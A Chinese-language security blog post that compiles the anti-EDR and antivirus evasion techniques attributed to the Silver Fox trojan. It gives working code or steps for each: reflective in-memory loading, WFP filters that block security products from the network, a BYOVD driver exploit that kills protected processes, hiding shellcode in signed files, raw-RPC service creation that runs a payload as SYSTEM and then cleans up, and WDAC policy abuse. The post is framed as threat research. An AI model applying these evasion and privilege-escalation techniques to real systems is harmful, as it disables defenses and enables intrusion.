---
title: 2025上半年银狐木马对抗手法POC
date: 2025-12-15 18:00:00 -0500
categories: [Research]
tags: [malware, trojan, silver-fox, winos, apt, malware-analysis, poc]
description: 列举了一些银狐木马常用对抗杀软/EDR手段以及代码实现.
media_subpath: /assets/img/2025-12-15-silver-fox-poc-2025
---

银狐（SilverFox）木马（又称 ValleyRAT 或 Winos 变种）是针对中国国内政企、财务及医疗系统威胁最高的远控工具之一，其 EDR/杀软对抗技术已演进至内核阶段。

该木马部分变种以 **“驱动利用 + 签名欺骗”** 为核心逻辑，展现出极高的对抗强度：

*   **静态层面**：不仅利用“白加黑”技术劫持合法签名程序，更通过修改已签名驱动的非校验字节（如时间戳）来改变文件哈希。这种手法既能绕过哈希黑名单，又能维持微软数字签名的有效性。
*   **动态对抗**：2025 年的变种大规模采用了 **BYOVD (Bring Your Own Vulnerable Driver)** 战术。通过强制加载存在已知或“未知”漏洞的合法驱动（如 WatchDog、Zemana 或国产反作弊驱动），在 Ring 0 层暴力结束 EDR 进程或摘除内核监控钩子 (Hook)。
*   **隐蔽通信**：核心载荷常通过 LSB 图片隐写或加密内存加载实现“无文件”运行，并结合云存储 (OSS) 流量隧道，使其在端点与网络侧均具备极高的隐蔽性。

本文整理了银狐木马常用的对抗 AV/EDR 手段的代码实现。这些内容基于我对多篇分析报告的研读以及开源社区项目的搜集。为了验证这些技术，我制作了一系列测试样本并发布于卡饭安全论坛。

在本篇博客中，我将分享相关的代码片段、开源 Codebase，并演示如何使用 Python 将其整合为 Demo 测试样本。

## 反射式 DLL 注入 (RDI)

虽然大部分对抗技术的原始代码是 C/C++ 编写的，但为了简化集成流程并提高 Demo 开发效率，我选择 **Python** 作为主要语言，并利用 **RDI (Reflective DLL Injection)** 技术来实现静态免杀。

### 静态免杀思路

实现静态免杀的最佳方法之一是让 Payload 或关键 Binary 在内存中解密执行，避免落地。常见的实现路径有：
1.  从网络直接下载至内存 Buffer 并执行。
2.  读取加密的磁盘 Payload，在内存中解密后执行。

### 宿主进程选择

通常情况下，我们需要挑选一个合适的宿主进程。一个完美的宿主进程应具备以下特征：
1.  **拥有有效签名**：系统中最受信任的可执行文件。
2.  **高频使用**：经常出现在用户电脑中，不会引起怀疑。
3.  **行为特征**：日常参与大量文件或网络 I/O 操作。
4.  **执行能力**：最好是解释器或具有执行任意代码的能力。

基于以上标准，Python 的脚本解释器 `python.exe` 是一个完美的选项。银狐木马也采用了类似的 RDI 操作，利用白名单进程进行掩护。

### 代码实现

Python 社区已经提供了现成的库：[PythonMemoryModule](https://github.com/naksyn/PythonMemoryModule)。

导入此库后，即可将任意 DLL/EXE 加载进 `python.exe` 宿主进程的内存中。经过本地测试，C/C++ 编译的 EXE 可以完美运行，但 .NET 程序无法正常工作。

```python
import pythonmemorymodule

# data 为读取到的二进制数据（如加密 payload 解密后的 bytes）
pythonmemorymodule.MemoryModule(data=data)
```

## 利用 WFP 断网杀软/EDR

**Windows Filtering Platform (WFP)** 是 Windows Vista 及更高版本引入的一套网络流量过滤架构。它为防火墙、入侵检测系统（IDS）、杀毒软件等安全产品提供了统一的底层 API，用于检查和修改网络数据包。

虽然许多安全产品通过 WFP Callout 驱动来实现网络监控，但恶意软件同样可以利用这一机制，注册恶意的 WFP 过滤器来隐藏自身流量或阻断安全软件的通信。

### 传统方法 vs. WFP

在传统攻防场景中，操控网络流量通常需要内核级访问权限（例如使用 NDIS 驱动或 TDI 过滤）。这种方式门槛较高，攻击者必须面对以下挑战：

*   编写并获取合法的内核驱动签名。
*   绕过驱动签名强制执行（Driver Signature Enforcement）。
*   对抗 PatchGuard (KPP) 等内核保护机制。

相比之下，WFP 的用户态引擎 —— **基础过滤引擎 (BFE, Base Filtering Engine)** —— 允许任何拥有管理员权限的进程通过用户态 API 添加过滤器，而**无需编写或加载内核驱动**。攻击者只需调用 `fwpuclnt.dll` 中的几个函数，即可实现对网络层的控制。

### EDRSilencer 与银狐的实现

开源项目 [EDRSilencer](https://github.com/netero1010/EDRSilencer) 正是基于这一原理诞生的。该工具于 2023 年末发布，旨在针对 EDR/AV 进程设置 WFP 过滤器，从而屏蔽其与云端的通信，使其无法上报威胁信息。银狐木马在 2025 年的变种中也采用了完全相同的手段。

为了规避检测，EDRSilencer 的作者自己实现了 `FwpmGetAppIdFromFileName0` 函数，避免了直接调用 `CreateFileW`，从而成功绕过了 Minifilter 的监控。

以下是基于 EDRSilencer 核心逻辑的代码片段，展示了如何配置 WFP 过滤器以阻断特定进程的流量：

```cpp
// 设置过滤器显示名称（用于 netsh wfp show filters 等管理命令）
filter.displayData.name = filterName;

// PERSISTENT: 持久化过滤器，存储在注册表中，系统重启后依然生效直到显式删除
filter.flags = FWPM_FILTER_FLAG_PERSISTENT;

// ALE_AUTH_CONNECT_V4: 出站连接授权层，TCP connect() / UDP首包 / ICMP首包时触发，有状态，每连接仅评估一次
filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;

// BLOCK: 阻断匹配的网络流量
filter.action.type = FWP_ACTION_BLOCK;

// 权重 = 优先级，UINT64_MAX 确保此过滤器先于 EDR 自身的 PERMIT 规则被评估
UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
filter.weight.type = FWP_UINT64;
filter.weight.uint64 = &weightValue;

// ALE_APP_ID: 按应用程序路径匹配（NT 设备路径格式，如 \device\harddiskvolume1\...\xxx.exe）
cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
// 精确匹配
cond.matchType = FWP_MATCH_EQUAL;
// appId 是 FWP_BYTE_BLOB 结构，由 FwpmGetAppIdFromFileName0() 或自定义实现获取
cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
cond.conditionValue.byteBlob = appId;

// 关联条件到过滤器，多条件为 AND 关系
filter.filterCondition = &cond;
filter.numFilterConditions = 1;

// Provider: 过滤器的逻辑分组/所有者标识，便于管理和批量删除
if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
    filter.providerKey = &providerGuid;  // 复用已存在的 Provider
} else {
    provider.displayData.name = providerName;
    provider.displayData.description = providerDescription;
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;  // Provider 也持久化
    result = FwpmProviderAdd0(hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
    } else {
        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
            filter.providerKey = &providerGuid;
        }
    }
}

// 添加 IPv4 出站阻断过滤器，filterId 用于后续 FwpmFilterDeleteById0 删除
result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
if (result == ERROR_SUCCESS) {
    printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
} else {
    printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
}

// 同时阻断 IPv6，防止 EDR 通过 IPv6 通信
filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
if (result == ERROR_SUCCESS) {
    printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
} else {
    printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
}
```

## BYOVD

**BYOVD (Bring Your Own Vulnerable Driver)** 是一种利用合法签名但存在漏洞的驱动程序来实现内核级攻击的技术。由于 Windows 驱动程序运行在 Ring 0（内核态），拥有最高的系统权限，攻击者无需自己编写驱动（这通常会被驱动签名强制执行机制拦截），而是直接携带一个已被微软签名的、但存在已知漏洞的合法驱动。加载该驱动后，攻击者便可利用其漏洞实现以下目标：

*   任意内核内存读写
*   关闭或绕过 EDR/AV 的内核回调 (Kernel Callbacks)
*   提权至 SYSTEM 权限
*   隐藏恶意进程或文件

要判断一个 `.sys` 驱动是否存在可利用空间，通常可以检查其 IOCTL 处理程序是否调用了以下内核函数且未做严格的权限校验：

*   `ZwOpenProcess`：获取进程句柄
*   `ZwTerminateProcess`：终止进程
*   `ZwWriteVirtualMemory`：破坏进程内存
*   `ZwAllocateVirtualMemory`：分配内存（通常配合写入使用）
*   `MmCopyVirtualMemory`：拷贝内存（可用于破坏进程内存）

银狐自诞生之初就在不断利用漏洞驱动与杀软/EDR 进行对抗。可以肯定的是，他们拥有独立的研究团队，并持续发掘潜在的 BYOVD 资源。无论是从开源项目还是其他渠道获取，其利用的漏洞驱动数量极高，且相当一部分是未知的，或者尚未被收录在 [LOLDrivers](https://www.loldrivers.io/) 项目中。

### wamsdk.sys

根据 Check Point 在 2025 年 8 月发布的[报告](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)，银狐利用了 **WatchDog Antimalware** 软件中的 `wamsdk.sys` 驱动，通过调用 `ZwTerminateProcess` 来强制结束 EDR/杀软进程。两个月后，安全研究员 j3h4ck 在 GitHub 上开源了此驱动的 POC：[WatchDogKiller](https://github.com/j3h4ck/WatchDogKiller)。截至 10 月份，此漏洞驱动尚未被 LOLDrivers 和微软的漏洞驱动阻止列表（Microsoft Vulnerable Driver Blocklist）收录。

`wamsdk.sys` 暴露了两个具有严重安全缺陷的 IOCTL：

| IOCTL | Code | 功能 |
| :--- | :--- | :--- |
| `IOCTL_REGISTER_PROCESS` | `0x80002010` | 注册进程到授权白名单 |
| `IOCTL_TERMINATE_PROCESS` | `0x80002048` | 终止任意进程 |

**漏洞解析：**

1.  `IOCTL_REGISTER_PROCESS` 存在严重逻辑缺陷，任何进程都可以将自己的 PID 注册到白名单中，**且无任何权限校验**。

    ![alt text](1.png)

2.  即便 `IOCTL_TERMINATE_PROCESS` 内部有 `ZmnAuthIsRegisteredProcessId` 授权检查，攻击者只需先完成第一步注册，即可轻松绕过。

    ![alt text](2.png)

3.  驱动最终以内核权限调用 `ZwTerminateProcess`，这将绕过所有用户态保护机制（包括 PPL 保护进程）。

    ![alt text](3.png)

至此，该驱动可以在开启了 HVCI (Hypervisor-Protected Code Integrity) 的最新版 Windows 11 机器上成功运行。下面是 POC 的关键代码片段：

```cpp
// ========== Step 1: 注册自己到白名单（绕过授权检查） ==========
DWORD pid = GetCurrentProcessId();
DeviceIoControl(
    hDevice,
    0x80002010,          // IOCTL_REGISTER_PROCESS
    &pid, sizeof(pid),   // 只需传入自己的 PID，无任何校验！
    NULL, 0, &bytesReturned, NULL
);

// ========== Step 2: 杀掉任意目标进程 ==========
typedef struct {
    DWORD ProcessId;     // 目标 PID
    DWORD WaitForExit;   // 是否等待退出
} TERMINATE_REQUEST;

TERMINATE_REQUEST req = { targetPid, 0 };
DeviceIoControl(
    hDevice,
    0x80002048,          // IOCTL_TERMINATE_PROCESS  
    &req, sizeof(req),   // 内核态 ZwTerminateProcess，无视 PPL 保护
    NULL, 0, &bytesReturned, NULL
);
```

## SigFlip

**SigFlip** 利用了 Windows Authenticode 签名机制的一个设计特性：允许在不破坏数字签名有效性的情况下，向已签名的 PE 文件中嵌入任意数据。

这一特性与 `WIN_CERTIFICATE` 结构有关：

```c
typedef struct _WIN_CERTIFICATE {
    DWORD dwLength;           // 证书表大小
    WORD  wRevision;          // 版本
    WORD  wCertificateType;   // 证书类型
    BYTE  bCertificate[];     // 实际证书数据（PKCS#7 SignedData）
} WIN_CERTIFICATE;
```

SigFlip 的核心原理是在 `bCertificate` 字段后面追加数据（Padding）。由于这部分数据不参与哈希计算，因此不会破坏签名的完整性。具体流程如下：

1.  加载 PE 文件并验证现有签名。
2.  定位 `IMAGE_DIRECTORY_ENTRY_SECURITY`（Optional Header 中的安全目录）。
3.  获取证书表的 RVA (Relative Virtual Address) 和 Size。
4.  在证书表末尾追加自定义数据（如 Shellcode 或加密配置）。
5.  更新 `WIN_CERTIFICATE.dwLength` 和目录项的 Size。
6.  重新计算并更新 PE 文件的 Checksum。

银狐利用此工具来绕过基于哈希的检测机制（例如安全厂商通过拉黑易受攻击驱动的文件哈希来防御 BYOVD）。通过制造同一驱动的不同变种（Hash 不同但签名依然有效），银狐将 BYOVD 漏洞驱动的生命周期利用到了极致。此外，这种技术也可用于其他“白利用”场景。

开源工具 [gSigFlip](https://github.com/akkuman/gSigFlip) 提供了现成的 CLI 程序，可用于快速生成改造过的签名 PE 文件：

```powershell
Usage of gSigFlip.exe:
  -out string
        output pe file path (default "out.exe")
  -pe string
        pe file path which you want ot hide data
  -sf string
        the path of the file where shellcode is stored
  -tag string
        the tag you want to use, support "\x1a \xdf" "\x1a\xdf" "1a, df" "1a df" (default "fe ed fa ce fe ed fa ce")
  -xor string
        the xor key you want to use
```

## CreateSvcRpc

**CreateSvcRpc** 是一种通过原始 RPC 协议直接操控 Windows 服务控制管理器 (SCM) 从而以 SYSTEM 权限执行命令的技术。该技术的原始 POC 由安全研究员 **x86matthew** 于 2022 年公开。随后，GitHub 用户 antonioCoco 在其项目 [SspiUacBypass](https://github.com/antonioCoco/SspiUacBypass/blob/main/CreateSvcRpc.cpp) 中提供了基于 x86matthew 代码修改而来的实现。

### 核心原理

其核心逻辑在于**直接进行 RPC 通信**，从而绕过高层 Win32 API。通常，EDR/AV 产品会 Hook `OpenSCManager()` 或 `CreateService()` 等标准 API 来监控服务创建行为。而 CreateSvcRpc 不调用这些 API，而是通过命名管道直接与 SCM 的 RPC 接口通信，手工构造 DCE/RPC 协议数据包。这种方式可以有效避开基于 API Hook 的检测机制。

### RPC 协议实现细节

该实现主要涉及以下组件：

| 组件 | 说明 |
| :--- | :--- |
| **Bind Request** | 绑定到 `367abb81-9844-35f1-ad32-98f038001003` (SVCCTL v2.0) |
| **NDR 传输语法** | `8a885d04-1ceb-11c9-9fe8-08002b104860` |
| **请求/响应处理** | 手工序列化参数，需严格遵守 4 字节对齐规则 |

#### DCE/RPC Bind 请求数据包布局

整个 RPC Bind 请求包结构如下：

```text
+---------------------------+
|    RpcBaseHeader (16B)    |  ← 所有 RPC 包都有的公共头
+---------------------------+
|  RpcBindRequestHeader     |  ← Bind 特有的参数
+---------------------------+
|    Context Entry          |  ← 要绑定的接口信息
+---------------------------+
```

**RpcBaseHeader (16 字节)**

| 偏移 | 大小 | 字段 | 值 | 说明 |
| :--- | :--- | :--- | :--- | :--- |
| 0x00 | 2 | `wVersion` | `0x0005` | DCE/RPC v5 |
| 0x02 | 1 | `bPacketType` | `0x0B` (11) | Bind 请求 |
| 0x03 | 1 | `bPacketFlags` | `0x03` | `PFC_FIRST_FRAG \| PFC_LAST_FRAG` |
| 0x04 | 4 | `dwDataRepresentation` | `0x00000010` | Little-endian, ASCII, IEEE |
| 0x08 | 2 | `wFragLength` | `72` | 整个包的长度 |
| 0x0A | 2 | `wAuthLength` | `0` | 无认证数据 |
| 0x0C | 4 | `dwCallIndex` | `1` | 调用序号 |

**RpcBindRequestHeader (12 字节)**

| 偏移 | 大小 | 字段 | 值 | 说明 |
| :--- | :--- | :--- | :--- | :--- |
| 0x10 | 2 | `wMaxSendFrag` | `4096` | 最大发送分片 |
| 0x12 | 2 | `wMaxRecvFrag` | `4096` | 最大接收分片 |
| 0x14 | 4 | `dwAssocGroup` | `0` | 关联组 (新连接为0) |
| 0x18 | 1 | `bContextCount` | `1` | 上下文数量 |
| 0x19 | 3 | `bAlign[3]` | `0,0,0` | 对齐填充 |

**Context Entry (44 字节)**

| 偏移 | 大小 | 字段 | 值 | 说明 |
| :--- | :--- | :--- | :--- | :--- |
| 0x1C | 2 | `wContextID` | `0` | 上下文 ID |
| 0x1E | 2 | `wTransItemCount` | `1` | 传输语法数量 |
| 0x20 | 16 | `bInterfaceUUID` | `367abb81...` | SVCCTL 接口 (UUID: `367abb81-9844-35f1-ad32-98f038001003`) |
| 0x30 | 4 | `dwInterfaceVersion` | `0x00000002` | 版本 2.0 |
| 0x34 | 16 | `bTransferSyntaxUUID` | `8a885d04...` | NDR 语法 (UUID: `8a885d04-1ceb-11c9-9fe8-08002b104860`) |
| 0x44 | 4 | `dwTransferSyntaxVersion` | `0x00000002` | NDR v2 |

### 代码实现片段

以下是构造 RPC 请求并创建服务的关键代码逻辑：

```cpp
int InvokeCreateSvcRpcMain(char* pExecCmd)
{
    RpcConnectionStruct RpcConnection;
    BYTE bServiceManagerObject[20];  // SCM 句柄 (RPC 上下文句柄, 固定20字节)
    BYTE bServiceObject[20];         // 服务句柄
    char szServiceName[256];
    char szServiceCommandLine[256];

    // 生成随机服务名，避免冲突
    _snprintf(szServiceName, sizeof(szServiceName) - 1, 
              "CreateSvcRpc_%u", GetTickCount());

    // 关键: 用 "cmd /c start" 包装 payload
    // 这样服务启动后立即返回，不会因超时报错
    _snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1, 
              "cmd /c start %s", pExecCmd);

    //-------------------------------------------------------------------------
    // Step 1: 连接 SVCCTL RPC 接口
    // ntsvcs = SCM 的命名管道
    // 367abb81-9844-35f1-ad32-98f038001003 = SVCCTL 接口 UUID (MS-SCMR 规范)
    //-------------------------------------------------------------------------
    if (RpcConnect("ntsvcs", "367abb81-9844-35f1-ad32-98f038001003", 2, &RpcConnection) != 0)
        return 1;

    //-------------------------------------------------------------------------
    // Step 2: ROpenSCManagerW (Opnum 27) - 获取 SCM 句柄
    //-------------------------------------------------------------------------
    RpcInitialiseRequestData(&RpcConnection);
    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // lpMachineName = NULL
    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // lpDatabaseName = NULL  
    RpcAppendRequestData_Dword(&RpcConnection, SC_MANAGER_ALL_ACCESS); // dwDesiredAccess
    RpcSendRequest(&RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER);       // Opnum 27
    
    // 响应前20字节是 SCM 句柄，后4字节是返回值
    memcpy(bServiceManagerObject, &RpcConnection.bProcedureOutputData[0], 20);

    //-------------------------------------------------------------------------
    // Step 3: RCreateServiceW (Opnum 24) - 创建服务
    // 这里手工序列化了 CreateService 的所有参数
    //-------------------------------------------------------------------------
    RpcInitialiseRequestData(&RpcConnection);
    RpcAppendRequestData_Binary(&RpcConnection, bServiceManagerObject, 20);  // hSCManager
    RpcAppendRequestData_Dword(&RpcConnection, dwServiceNameLength);         // 服务名长度
    RpcAppendRequestData_Dword(&RpcConnection, 0);                           // (对齐填充)
    RpcAppendRequestData_Dword(&RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)szServiceName, dwServiceNameLength);
    RpcAppendRequestData_Dword(&RpcConnection, 0);                           // lpDisplayName
    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_ALL_ACCESS);          // dwDesiredAccess
    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_WIN32_OWN_PROCESS);   // dwServiceType
    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_DEMAND_START);        // dwStartType (手动启动)
    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_ERROR_IGNORE);        // dwErrorControl
    // ... lpBinaryPathName (我们的 payload 命令行) ...
    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)szServiceCommandLine, dwServiceCommandLineLength);
    // ... 其他参数 (LoadOrderGroup, Dependencies 等都设为 NULL) ...
    RpcSendRequest(&RpcConnection, RPC_CMD_ID_CREATE_SERVICE);  // Opnum 24

    // 响应: [0-3] TagId, [4-23] 服务句柄, [24-27] 返回值
    memcpy(bServiceObject, &RpcConnection.bProcedureOutputData[4], 20);

    //-------------------------------------------------------------------------
    // Step 4: RStartServiceW (Opnum 31) - 启动服务
    // 服务会以 SYSTEM 身份运行，执行我们的 payload
    //-------------------------------------------------------------------------
    RpcInitialiseRequestData(&RpcConnection);
    RpcAppendRequestData_Binary(&RpcConnection, bServiceObject, 20);  // hService
    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // argc = 0
    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // argv = NULL
    RpcSendRequest(&RpcConnection, RPC_CMD_ID_START_SERVICE);         // Opnum 31
    
    // 注意: 返回 ERROR_SERVICE_REQUEST_TIMEOUT (1053) 是正常的
    // 因为我们的 "服务" 不是真正的服务程序，不会响应 SCM 的控制请求

    //-------------------------------------------------------------------------
    // Step 5: RDeleteService (Opnum 2) - 删除服务，清理痕迹
    //-------------------------------------------------------------------------
    RpcInitialiseRequestData(&RpcConnection);
    RpcAppendRequestData_Binary(&RpcConnection, bServiceObject, 20);
    RpcSendRequest(&RpcConnection, RPC_CMD_ID_DELETE_SERVICE);  // Opnum 2

    RpcDisconnect(&RpcConnection);
    return 0;
}
```

根据[火绒安全的报告](https://www.huorong.cn/document/tech/vir_report/1846)，银狐木马正是利用此技术来加载 BYOVD 驱动，从而规避了常规的行为监控。

## WDAC 策略滥用

**WDAC (Windows Defender Application Control)** 是 Windows 10 及更高版本中默认启用的应用控制机制。它旨在控制哪些代码（包括用户态应用程序和内核态驱动程序）被允许在系统上执行。

2024 年底，安全研究员 **Jonathan Beierle** 和 **Logan Goins** 发布了一篇名为 [Weaponizing WDAC - Killing the Dreams of EDR](https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/) 的文章，详细描述了如何滥用 WDAC 机制来禁用杀毒软件和 EDR 的运行。

这一攻击手法的核心关键点在于：**WDAC 策略在系统启动阶段的加载优先级高于 EDR 驱动程序**。

### 攻击流程

1.  **制作恶意 WDAC 策略 (`SiPolicy.p7b`)**
    攻击者可以使用微软官方工具 [App Control Policy Wizard](https://webapp-wdac-wizard.azurewebsites.net) 创建自定义策略：
    *   **阻止**：列入 EDR 相关的 EXE、DLL 及驱动程序。
    *   **允许**：放行特定路径（如 `C:\Users\Public\*`），供攻击者工具运行。

2.  **部署策略文件**
    将生成的 `SiPolicy.p7b` 文件放置于 `C:\Windows\System32\CodeIntegrity\` 目录下（此步需要管理员权限）。

3.  **重启目标机器**
    使策略生效。

4.  **系统启动时的执行顺序**
    *   WDAC 策略率先加载并生效。
    *   EDR 的驱动或服务尝试启动，但因策略限制被阻止加载。
    *   攻击者放置在白名单路径下的恶意工具则可以正常运行，且不受 EDR 监控。

根据腾讯安全的[分析报告](https://www.freebuf.com/articles/vuls/438775.html)，银狐木马在实战中采用了完全相同的对抗手段，通过滥用 WDAC 策略来禁用目标机器上的安全防护软件。

